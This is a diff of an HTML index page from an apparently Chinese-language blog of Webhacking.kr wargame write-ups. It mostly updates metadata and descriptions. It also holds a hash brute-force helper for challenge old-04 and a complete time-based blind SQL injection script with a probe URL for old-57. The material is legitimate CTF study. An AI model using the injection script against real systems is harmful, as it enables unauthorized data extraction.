@@ -278,7 +278,7 @@ p.spoiler {
   
   
 
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/webhacking/g00gle1/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -338,6 +338,7 @@ p.spoiler {
     </span>
 </div>
 
+            <div class="post-description">Webhacking.kr g00gle1 的题目分析与方法记录，涉及 web。</div>
         </div>
       </header>
 
@@ -399,7 +400,7 @@ flag。</p>
   
   
 
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/webhacking/old-04/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -448,17 +449,18 @@ flag。</p>
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">Word count in article: </span>
-      <span>883</span>
+      <span>993</span>
     </span>
     <span class="post-meta-item" title="Reading time">
       <span class="post-meta-item-icon">
         <i class="far fa-clock"></i>
       </span>
       <span class="post-meta-item-text">Reading time &asymp;</span>
-      <span>3 mins.</span>
+      <span>4 mins.</span>
     </span>
 </div>
 
+            <div class="post-description">Webhacking.kr old-04 的题目分析与方法记录，涉及 web, sha1, cuda。</div>
         </div>
       </header>
 
@@ -482,8 +484,10 @@ session 值，因此 hash 的计算和提交必须使用同一次
 session、同一次页面请求。</p>
 <h3 id="solution">Solution</h3>
 <p>对每个 8 位候选值执行以下计算：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">repeated_sha1</span>(<span class="params">number: <span class="built_in">int</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    value = <span class="string">f&quot;<span class="subst">&#123;number&#125;</span>salt_for_you&quot;</span>.encode()</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">        value = hashlib.sha1(value).hexdigest().encode()</span><br><span class="line">    <span class="keyword">return</span> value.decode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> number <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10_000_000</span>, <span class="number">100_000_000</span>):</span><br><span class="line">    <span class="keyword">if</span> repeated_sha1(number) == target_hash:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;number&#125;</span>salt_for_you&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
-<p>纯 Python 逐一计算可以验证算法，但完整搜索成本较高。CUDA solver
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">repeated_sha1</span>(<span class="params">number: <span class="built_in">int</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    value = <span class="string">f&quot;<span class="subst">&#123;number&#125;</span>salt_for_you&quot;</span>.encode()</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">        value = hashlib.sha1(value).hexdigest().encode()</span><br><span class="line">    <span class="keyword">return</span> value.decode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>() -&gt; <span class="literal">None</span>:</span><br><span class="line">    parser = argparse.ArgumentParser()</span><br><span class="line">    parser.add_argument(<span class="string">&quot;target_hash&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;40 lowercase hex characters from the current page&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;--start&quot;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">10_000_000</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;--count&quot;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">1000</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> re.fullmatch(<span class="string">r&quot;[0-9a-f]&#123;40&#125;&quot;</span>, args.target_hash):</span><br><span class="line">        parser.error(<span class="string">&quot;target_hash must contain 40 lowercase hex characters&quot;</span>)</span><br><span class="line">    stop = args.start + args.count</span><br><span class="line">    <span class="keyword">if</span> args.count &lt;= <span class="number">0</span> <span class="keyword">or</span> <span class="keyword">not</span> <span class="number">10_000_000</span> &lt;= args.start &lt; stop &lt;= <span class="number">100_000_000</span>:</span><br><span class="line">        parser.error(<span class="string">&quot;range must be inside the eight-digit candidate space&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> number <span class="keyword">in</span> <span class="built_in">range</span>(args.start, stop):</span><br><span class="line">        <span class="keyword">if</span> repeated_sha1(number) == args.target_hash:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;number&#125;</span>salt_for_you&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">raise</span> SystemExit(<span class="string">&quot;No match in the requested range; the remaining space was not searched&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+<p>将 Python 块保存为 <code>old04_reference.py</code>，以
+<code>python3 old04_reference.py &lt;target-hash&gt; --start 10000000 --count 1000</code>
+搜索指定区间。默认只检查 1000 个候选值；完整搜索成本较高。CUDA solver
 将候选空间分配给 GPU threads，并在 device 端完成 500 轮 SHA-1。GPU
 内部每轮的输入是上一轮 digest 的 40 个 lowercase hexadecimal ASCII
 字符，最终比较的也是 40 个 ASCII 字符；比较 digest bytes
@@ -515,7 +519,7 @@ session、同一次页面请求。</p>
   
   
 
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/webhacking/old-25-revenge/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -575,6 +579,7 @@ session、同一次页面请求。</p>
     </span>
 </div>
 
+            <div class="post-description">Webhacking.kr old-25 RevengE 的题目分析与方法记录，涉及 web, lfi, php, php-filter。</div>
         </div>
       </header>
 
@@ -668,7 +673,7 @@ filter；更换部署时需根据响应确认链条是否有效。</p>
   
   
 
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/webhacking/ouroboros-golf/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -728,6 +733,7 @@ filter；更换部署时需根据响应确认链条是否有效。</p>
     </span>
 </div>
 
+            <div class="post-description">Webhacking.kr ouroboros golf 的题目分析与方法记录，涉及 web, sql-injection, quine。</div>
         </div>
       </header>
 
@@ -790,7 +796,7 @@ filter；更换部署时需根据响应确认链条是否有效。</p>
   
   
 
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/webhacking/old-13/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -850,6 +856,7 @@ filter；更换部署时需根据响应确认链条是否有效。</p>
     </span>
 </div>
 
+            <div class="post-description">Webhacking.kr old-13 的题目分析与方法记录，涉及 web, blind-sql-injection。</div>
         </div>
       </header>
 
@@ -907,7 +914,7 @@ flag：</p>
   
   
 
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/webhacking/old-28/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -967,6 +974,7 @@ flag：</p>
     </span>
 </div>
 
+            <div class="post-description">Webhacking.kr old-28 的题目分析与方法记录，涉及 web, upload, apache。</div>
         </div>
       </header>
 
@@ -1017,7 +1025,7 @@ PHP handler；<code>php_flag engine off</code> 关闭 PHP
   
   
 
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/webhacking/old-43-revenge/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1077,6 +1085,7 @@ PHP handler；<code>php_flag engine off</code> 关闭 PHP
     </span>
 </div>
 
+            <div class="post-description">Webhacking.kr old-43 RevengE 的题目分析与方法记录，涉及 web, file-upload, imagick。</div>
         </div>
       </header>
 
@@ -1134,7 +1143,7 @@ metadata，上传结果就会以 <code>.php</code> 文件名保存，并由 PHP
   
   
 
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/webhacking/old-44/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1194,6 +1203,7 @@ metadata，上传结果就会以 <code>.php</code> 文件名保存，并由 PHP
     </span>
 </div>
 
+            <div class="post-description">Webhacking.kr old-44 的题目分析与方法记录，涉及 web, command-injection。</div>
         </div>
       </header>
 
@@ -1249,7 +1259,7 @@ flag 文件名。</p>
   
   
 
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/webhacking/old-57/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1298,7 +1308,7 @@ flag 文件名。</p>
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">Word count in article: </span>
-      <span>489</span>
+      <span>477</span>
     </span>
     <span class="post-meta-item" title="Reading time">
       <span class="post-meta-item-icon">
@@ -1309,6 +1319,7 @@ flag 文件名。</p>
     </span>
 </div>
 
+            <div class="post-description">Webhacking.kr old-57 的题目分析与方法记录，涉及 web, sql-injection, blind-sql-injection。</div>
         </div>
       </header>
 
@@ -1340,8 +1351,7 @@ oracle，而不是依赖页面正文。</p>
 <p>其中 <code>N</code> 替换为待测试长度。单字符探针：</p>
 <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://webhacking.kr/challenge/web-34/?msg=a&amp;se=IF%28ASCII%28SUBSTR%28pw%2CN%2C1%29%29%3DC%2CSLEEP%282%29%2CSLEEP%280%29%29</span><br></pre></td></tr></table></figure>
 <p>其中 <code>N</code> 是 1-based 位置，<code>C</code> 是待测试字符的
-ASCII 数值。以下脚本包含长度枚举、字符枚举、请求参数编码、延迟阈值和
-entry point；它不包含任何真实 cookie：</p>
+ASCII 数值。脚本按页面输入编码请求，使用延迟阈值枚举长度与字符：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">BASE_URL = os.environ.get(<span class="string">&quot;WEBHACKING_BASE&quot;</span>, <span class="string">&quot;https://webhacking.kr&quot;</span>)</span><br><span class="line">ENDPOINT = <span class="string">f&quot;<span class="subst">&#123;BASE_URL&#125;</span>/challenge/web-34/&quot;</span></span><br><span class="line">SESSION_ID = os.environ.get(<span class="string">&quot;CHALLENGE_SESSION&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">SLEEP_SECONDS = <span class="number">2</span></span><br><span class="line">DELAY_THRESHOLD = <span class="number">1.5</span></span><br><span class="line">MAX_LENGTH = <span class="number">64</span></span><br><span class="line">CHARACTERS = string.ascii_letters + string.digits + string.punctuation</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_session</span>():</span><br><span class="line">    session = requests.Session()</span><br><span class="line">    session.headers.update(&#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;old-57-writeup/1.0&quot;</span>&#125;)</span><br><span class="line">    <span class="keyword">if</span> SESSION_ID:</span><br><span class="line">        session.cookies.<span class="built_in">set</span>(<span class="string">&quot;PHPSESSID&quot;</span>, SESSION_ID, domain=<span class="string">&quot;webhacking.kr&quot;</span>, path=<span class="string">&quot;/&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> session</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">request_is_true</span>(<span class="params">session, condition</span>):</span><br><span class="line">    expression = (</span><br><span class="line">        <span class="string">f&quot;IF(<span class="subst">&#123;condition&#125;</span>,SLEEP(<span class="subst">&#123;SLEEP_SECONDS&#125;</span>),SLEEP(0))&quot;</span></span><br><span class="line">    )</span><br><span class="line">    started = time.monotonic()</span><br><span class="line">    response = session.get(</span><br><span class="line">        ENDPOINT,</span><br><span class="line">        params=&#123;<span class="string">&quot;msg&quot;</span>: <span class="string">&quot;a&quot;</span>, <span class="string">&quot;se&quot;</span>: expression&#125;,</span><br><span class="line">        timeout=SLEEP_SECONDS + <span class="number">10</span>,</span><br><span class="line">    )</span><br><span class="line">    elapsed = time.monotonic() - started</span><br><span class="line">    response.raise_for_status()</span><br><span class="line">    <span class="keyword">return</span> elapsed &gt;= DELAY_THRESHOLD</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">discover_length</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">for</span> length <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, MAX_LENGTH + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> request_is_true(session, <span class="string">f&quot;LENGTH(pw)=<span class="subst">&#123;length&#125;</span>&quot;</span>):</span><br><span class="line">            <span class="keyword">return</span> length</span><br><span class="line">    <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;password length was not found&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recover_flag</span>(<span class="params">session, length</span>):</span><br><span class="line">    flag = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> position <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, length + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> character <span class="keyword">in</span> CHARACTERS:</span><br><span class="line">            code = <span class="built_in">ord</span>(character)</span><br><span class="line">            condition = <span class="string">f&quot;ASCII(SUBSTR(pw,<span class="subst">&#123;position&#125;</span>,1))=<span class="subst">&#123;code&#125;</span>&quot;</span></span><br><span class="line">            <span class="keyword">if</span> request_is_true(session, condition):</span><br><span class="line">                flag += character</span><br><span class="line">                <span class="built_in">print</span>(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">f&quot;no character matched at position <span class="subst">&#123;position&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    session = make_session()</span><br><span class="line">    length = discover_length(session)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;length=<span class="subst">&#123;length&#125;</span>&quot;</span>)</span><br><span class="line">    flag = recover_flag(session, length)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;flag=<span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
 <p>Timing oracle 对网络抖动敏感；<code>SLEEP_SECONDS</code> 和
 <code>DELAY_THRESHOLD</code> 需要根据当前网络基线调整。</p>
@@ -1370,7 +1380,7 @@ entry point；它不包含任何真实 cookie：</p>
   
   
 
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/webhacking/old-07/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1430,6 +1440,7 @@ entry point；它不包含任何真实 cookie：</p>
     </span>
 </div>
 
+            <div class="post-description">Webhacking.kr old-07 的题目分析与方法记录，涉及 web, sql-injection。</div>
         </div>
       </header>
 
@@ -1505,13 +1516,13 @@ payload 中的 <code>#</code> 编码为
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-line"></i>
     </span>
-    <span title="Word count total">379k</span>
+    <span title="Word count total">389k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="Reading time total">22:57</span>
+    <span title="Reading time total">23:34</span>
   </span>
 </div>
 <div class="busuanzi-count">
